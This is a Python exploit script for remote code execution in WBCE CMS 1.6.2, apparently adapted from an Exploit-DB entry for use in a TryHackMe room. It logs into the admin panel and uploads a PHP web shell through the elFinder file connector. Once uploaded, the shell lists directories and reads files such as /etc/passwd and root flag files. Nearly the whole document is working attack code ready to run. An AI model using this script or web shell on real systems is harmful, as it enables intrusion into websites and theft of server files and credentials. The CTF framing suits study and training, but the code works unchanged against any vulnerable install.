# Exploit Title: WBCE CMS v1.6.2 - Remote Code Execution (RCE)
# Date: 3/5/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://wbce-cms.org/
# Software Link: https://github.com/WBCE/WBCE_CMS/archive/refs/tags/1.6.2.zip
# Version: 1.6.2
# Tested on: MacOS
#  original script: https://www.exploit-db.com/exploits/52039
# Updated by Grok AI
# used on tryhackme room Avengers Hub https://tryhackme.com/room/HackfinityBattleEncore
# YouTube video link: https://youtu.be/XWBN_T3v0zY

import requests
from bs4 import BeautifulSoup
import sys
import time

def login(url, username, password):
    print("Logging in...")
    time.sleep(3)
    with requests.Session() as session:
        response = session.get(url + "/admin/login/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', attrs={'name': 'login'})
        form_data = {
            input_tag['name']: input_tag.get('value', '') 
            for input_tag in form.find_all('input') 
            if input_tag.get('type') != 'submit'
        }
        form_data[soup.find('input', {'name': 'username_fieldname'})['value']] = username
        form_data[soup.find('input', {'name': 'password_fieldname'})['value']] = password
        
        post_response = session.post(url + "/admin/login/index.php", data=form_data)
        if "Administration" in post_response.text:
            print("Login successful!")
            time.sleep(3)
            return session
        else:
            print("Login failed.")
            print("Headers received:", post_response.headers)
            print("Response content:", post_response.text[:500])
            return None

def upload_file(session, url):
    print("Shell preparing...")
    time.sleep(3)
    files = {
        'upload[]': (
            'shell.inc',
            """<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: text/html; charset=utf-8');
$current_dir = getcwd();
?>
<html>
<body>
<h2>Custom Command Shell</h2>
<p>Current User: <?php echo htmlspecialchars(get_current_user()); ?></p>
<p>Current Directory: <?php echo htmlspecialchars($current_dir); ?></p>
<form method="GET" name="cmdform">
<input type="text" name="cmd" autofocus id="cmd" size="80" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
<input type="submit" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $cmd = trim($_GET['cmd']);
    $output = '';
    
    // Split command into parts
    $parts = preg_split('/\s+/', $cmd);
    $command = strtolower($parts[0]);
    $arg = isset($parts[1]) ? $parts[1] : '';
    
    // Simulate common shell commands
    if($command === 'ls' || $command === 'dir') {
        $path = $arg ? $arg : $current_dir;
        if(file_exists($path) && is_dir($path)) {
            $dir = dir($path);
            $files = [];
            while(false !== ($entry = $dir->read())) {
                if($entry !== '.' && $entry !== '..') {
                    $files[] = $entry . (is_dir($path . '/' . $entry) ? '/' : '');
                }
            }
            $dir->close();
            $output = implode("\\n", $files);
        } else {
            $output = "Directory not found: $path";
        }
    } elseif($command === 'cat' || $command === 'type') {
        if($arg && file_exists($arg) && is_file($arg)) {
            $content = file_get_contents($arg);
            $output = $content ? $content : "File is empty or unreadable";
        } else {
            $output = "File not found: $arg";
        }
    } elseif($command === 'whoami') {
        $output = get_current_user();
    } elseif($command === 'cd') {
        if($arg && file_exists($arg) && is_dir($arg)) {
            chdir($arg);
            $output = "Changed directory to: " . getcwd();
        } else {
            $output = "Invalid directory: $arg";
        }
    } elseif($command === 'phpinfo') {
        ob_start();
        phpinfo();
        $output = ob_get_contents();
        ob_end_clean();
    } elseif($command === 'checkroot') {
        if(is_readable('/root/flag.txt')) {
            $output .= "Root flag: " . file_get_contents('/root/flag.txt');
        } elseif(is_readable('/flag.txt')) {
            $output .= "Flag: " . file_get_contents('/flag.txt');
        } else {
            $output = "No direct root flag access.\\n";
            $output .= "Home dirs: " . implode("\\n", scandir('/home')) . "\\n";
            $output .= "Readable /etc/passwd: " . (is_readable('/etc/passwd') ? "Yes" : "No");
        }
    } else {
        $output = "Unsupported command: $command\\nSupported: ls/dir, cat/type, whoami, cd, phpinfo, checkroot";
    }
    
    echo htmlspecialchars($output);
} else {
    echo "Enter a command (e.g., ls, cat /etc/passwd, whoami, checkroot)";
}
?>
</pre>
</body>
</html>""",
            'application/octet-stream'
        )
    }
    data = {
        'reqid': '18f3a5c13d42c5',
        'cmd': 'upload',
        'target': 'l1_Lw',
        'mtime[]': '1714669495'
    }
    response = session.post(
        url + "/modules/elfinder/ef/php/connector.wbce.php",
        files=files,
        data=data
    )
    if response.status_code == 200:
        print("Your Shell is Ready: " + url + "/media/shell.inc")
    else:
        print("Failed to upload file.")
        print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <url> <username> <password>")
        sys.exit(1)
        
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    session = login(url, username, password)
    if session:
        upload_file(session, url)
